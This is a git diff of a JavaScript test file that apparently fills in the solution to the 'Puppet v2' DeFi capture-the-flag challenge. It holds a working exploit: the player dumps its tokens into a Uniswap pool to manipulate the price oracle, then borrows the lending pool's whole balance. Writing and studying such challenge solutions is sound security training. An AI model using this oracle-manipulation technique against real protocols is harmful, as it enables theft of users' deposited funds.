@@ -1,4 +1,4 @@
-const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
+const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json"); 
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
 
@@ -82,7 +82,40 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const deadline = ethers.constants.MaxUint256;
+
+        //getting weth for eth - 0.1 ether (for transactions)
+        const sendEth = (await ethers.provider.getBalance(player.address)).sub(1n*10n**17n);
+        await weth.connect(player).deposit({value: sendEth});
+
+        //checking balances
+        let wethAmount = await weth.callStatic.balanceOf(player.address);
+        const ethBalance = await ethers.provider.getBalance(player.address);
+        console.log("ethBalance = ", ethBalance.div(10n**15n));
+        console.log("ethAmountSent = ", sendEth.div(10n**15n));
+        console.log("wethAmountReceived = ", wethAmount.div(10n**15n));
+
+        //approvals  
+        await token.connect(player).approve(uniswapRouter.address,ethers.constants.MaxUint256);  
+        await weth.connect(player).approve(lendingPool.address,ethers.constants.MaxUint256);   
+
+        //selling Tokens
+        console.log("before: ");
+        wethAmount = await weth.callStatic.balanceOf(player.address);
+        let tokenAmount = await token.callStatic.balanceOf(player.address);
+        console.log("wethAmount = ", wethAmount.div(10n**15n));
+        console.log("tokenAmount = ", tokenAmount.div(10n**15n));
+
+        await uniswapRouter.connect(player).swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE,1,[token.address,weth.address],player.address,deadline);
+
+        console.log("after: ");
+        wethAmount = await weth.callStatic.balanceOf(player.address);
+        tokenAmount = await token.callStatic.balanceOf(player.address);
+        console.log("wethAmount = ", wethAmount.div(10n**15n));
+        console.log("tokenAmount = ", tokenAmount.div(10n**15n));
+
+        //borrowing everything
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
